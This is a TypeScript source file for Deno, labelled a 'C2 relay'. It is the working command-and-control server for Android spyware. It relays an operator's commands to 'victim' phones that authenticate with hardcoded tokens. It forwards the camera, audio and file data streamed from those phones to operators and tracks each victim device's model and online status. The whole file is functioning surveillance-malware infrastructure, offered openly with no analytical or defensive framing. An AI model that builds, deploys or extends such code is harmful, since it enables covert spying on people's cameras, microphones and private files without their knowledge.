// main.ts — full C2 relay v2
type Role = "operator" | "victim";

interface DeviceInfo {
  token: string;
  name: string;
  model: string;
  android: string;
  online: boolean;
  lastSeen: number;
}

const OP_TOKEN = "OP123";
const DEV_TOKENS = new Set(["DEV123", "DEV456", "DEV789"]);

const operators = new Set<WebSocket>();
const victims = new Map<string, WebSocket>();
const devices = new Map<string, DeviceInfo>();

// routing binary: kalau operator sedang minta file tertentu, frame binary
// diberi prefix 1-byte marker biar bisa dibedakan
const BIN_CAMERA = 0;
const BIN_AUDIO  = 1;
const BIN_FILE   = 2;

Deno.serve((req) => {
  if (req.headers.get("upgrade") !== "websocket") {
    return new Response("camc2 alive", { status: 200 });
  }

  const url = new URL(req.url);
  const role = url.searchParams.get("role") as Role | null;
  const token = url.searchParams.get("token") ?? "";

  const { socket, response } = Deno.upgradeWebSocket(req);

  socket.onopen = () => {
    console.log("connect:", role, token);

    if (role === "operator") {
      if (token !== OP_TOKEN) { socket.close(4001); return; }
      operators.add(socket);
      socket.send(JSON.stringify({
        type: "device_list",
        devices: Array.from(devices.values()),
      }));
    } else if (role === "victim") {
      if (!DEV_TOKENS.has(token)) { socket.close(4002); return; }
      victims.set(token, socket);
      const existing = devices.get(token);
      const dev: DeviceInfo = existing ?? {
        token, name: "Unknown", model: "Unknown",
        android: "Unknown", online: true, lastSeen: Date.now(),
      };
      dev.online = true;
      dev.lastSeen = Date.now();
      devices.set(token, dev);
      broadcast({ type: "device_online", device: dev });
    } else {
      socket.close(4000);
    }
  };

  socket.onmessage = (ev) => {
    if (role === "operator") {
      try {
        const m = JSON.parse(ev.data as string);
        const v = victims.get(m.deviceToken);
        if (v && v.readyState === WebSocket.OPEN) v.send(JSON.stringify(m.payload));
      } catch (e) { console.log("op err", e); }
    } else if (role === "victim") {
      if (typeof ev.data === "string") {
        try {
          const msg = JSON.parse(ev.data);
          if (msg.type === "register") {
            const dev = devices.get(token);
            if (dev) {
              dev.name = msg.name ?? dev.name;
              dev.model = msg.model ?? dev.model;
              dev.android = msg.android ?? dev.android;
              dev.lastSeen = Date.now();
              broadcast({ type: "device_update", device: dev });
            }
          } else {
            broadcast({ type: "from_device", deviceToken: token, payload: msg });
          }
        } catch {}
      } else {
        // binary — prefix 1 byte (BIN_CAMERA / BIN_AUDIO / BIN_FILE)
        const buf = ev.data as ArrayBuffer;
        for (const op of operators) {
          if (op.readyState === WebSocket.OPEN) op.send(buf);
        }
      }
    }
  };

  socket.onclose = () => {
    if (role === "operator") operators.delete(socket);
    if (role === "victim" && token) {
      victims.delete(token);
      const dev = devices.get(token);
      if (dev) {
        dev.online = false;
        dev.lastSeen = Date.now();
        broadcast({ type: "device_offline", device: dev });
      }
    }
  };

  socket.onerror = (e) => console.log("err", e);
  return response;
});

function broadcast(obj: unknown) {
  const str = JSON.stringify(obj);
  for (const op of operators) {
    if (op.readyState === WebSocket.OPEN) op.send(str);
  }
}
